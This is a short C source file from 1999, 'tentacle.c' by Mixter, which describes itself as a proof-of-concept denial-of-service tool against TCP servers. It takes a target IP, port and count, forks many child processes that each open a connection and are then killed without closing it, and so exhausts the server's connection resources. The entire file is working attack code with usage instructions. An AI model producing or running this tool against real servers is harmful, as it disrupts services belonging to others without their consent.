/* tentacle.c (c) 1999 Mixter
 * multi-process octopus.c clone
 * members.xoom.com/i0wnu
 * proof-of-concept DoS against tcp (coded in 10 mins :p)
 * open a huge number of sockets to a server,
 * then terminate the process without closing
 * the connection on the server side (big fun) */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

char argv1[128]; int argv2,argv3;
void connexi0n (char *ip, int port);

int
main(int argc, char **argv) {
int pid,timer;

if (argc!=4) {
printf("usage: %s <IP> <port> <times>\n",argv[0]);
printf("<ip:port> must be a running server\n");
printf("WARNING: This will not spoof your IP\n");
exit(0);
}

strcpy(argv1,argv[1]); argv2=atoi(argv[2]); argv3=atoi(argv[3]);

for(timer=0;timer<=argv3;timer++) {
 usleep(250000);
 if ((pid=vfork()) < 0) { perror("fork"); exit(1); }
 if (pid==0) {
  connexi0n(argv1,argv2);
  kill(getpid(),9);
 }
}

return 0;
}

void
connexi0n (char *ip, int port)
{
struct sockaddr_in target;
target.sin_family = AF_INET;
target.sin_port = htons(port);
target.sin_addr.s_addr = inet_addr(ip);
connect(socket(AF_INET,SOCK_STREAM,0), (struct sockaddr *)&target,
        sizeof(struct sockaddr));
sleep(30);
return;
}
